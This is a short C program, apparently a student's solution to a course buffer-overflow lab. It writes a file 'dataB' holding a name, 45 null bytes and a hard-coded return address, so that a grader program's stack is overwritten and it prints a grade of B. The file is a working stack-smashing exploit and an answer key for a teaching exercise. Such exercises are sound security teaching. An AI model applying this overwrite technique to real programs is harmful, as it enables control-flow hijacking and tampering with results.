/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Authors: Catherine Yu and Joseph Chen                              */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* Create a file dataB. Write to dataB the input of grader such
   that the output prints B as the grade. Return 0. */

int main(void)
{
   int i;
   FILE *psFile;
   unsigned long ulData;

   /* Create file dataB */
   psFile = fopen("dataB", "w");

   /* Write the buffer overflow input to dataB */
   fprintf(psFile, "Joe");
   for(i = 0; i < 45; i++)
      putc('\0', psFile);

   /* Overwrite the address to main */
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned int), 1, psFile);

   fclose(psFile);
   
   return 0;

}
